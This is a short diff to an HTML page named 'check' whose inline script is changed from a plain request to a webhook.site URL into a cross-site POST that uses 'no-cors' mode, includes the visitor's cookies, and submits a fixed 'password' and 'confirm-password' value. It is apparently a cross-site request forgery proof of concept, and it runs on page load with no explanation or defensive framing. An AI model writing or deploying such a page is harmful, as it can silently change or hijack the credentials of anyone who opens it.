@@ -3,7 +3,15 @@
 <head><meta charset="utf-8"><title>check</title></head>
 <body>
 <script>
-fetch('https://webhook.site/df02ce14-efab-40d0-8a23-58ae955e652e?с=123');
+fetch('https://webhook.site/df02ce14-efab-40d0-8a23-58ae955e652e?f=123', {
+            method: 'POST',
+            mode: 'no-cors',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'password=SuperSecretPassword123%21&confirm-password=SuperSecretPassword123%21'
+        });
 </script>
 </body>
 </html>
